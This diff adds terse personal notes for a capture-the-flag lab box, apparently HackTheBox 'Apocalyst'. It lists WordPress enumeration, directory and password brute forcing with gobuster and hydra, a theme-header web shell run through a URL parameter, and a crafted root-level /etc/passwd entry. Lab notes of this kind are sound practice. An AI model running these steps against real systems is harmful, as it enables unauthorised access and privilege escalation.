@@ -1,0 +1,49 @@
+22/tcp open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+
+80/tcp open  ssl/http?
+
+ wpscan --url http://apocalyst.htb -e vt,tt,u,ap
+
+gobuster -u http://apocalyst.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+when navigates is to different urls its seperated by /
+
+so fit the settings in gobuster 
+ gobuster -u http://apocalyst.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+-f append a forward-slash to each directory request (dir mode only)
+
+-l include the length of the body in the output (dir mode only)
+
+cewl is a tool that generate wordlist of all the words on a webpage.
+
+
+gobuster -u http://apocalyst.htb -w  /home/xsisec/Desktop/HTB/Apocalyst/cewl.txt -f -l |
+
+| tee text.txt to (save the output )
+
+
+cat gobuster.txt | grep -v 'Size: 157'
+
+to don't display lines contains "Size: 157"
+
+steghide extract -sf image.jpg
+
+
+ wpscan --url apocalyst.htb -P /home/xsisec/Desktop/HTB/Apocalyst/list.txt  -U falaraki
+
+hydra -l falaraki -P /home/xsisec/Desktop/HTB/Apocalyst/list.txt apocalyst.htb http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -I
+
+
+http://apocalyst.htb/?xsisec=ls
+
+edit current theme header
+
+
+to upload a file 
+
+xsisec:$1$xsisec$cmPKNAv2.AWbqWLKxbI4H.:0:0:root:/bin/bash
+
+openssl passwd -1 -salt xsisec 1234
+
+echo "S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M=" | base64 -d
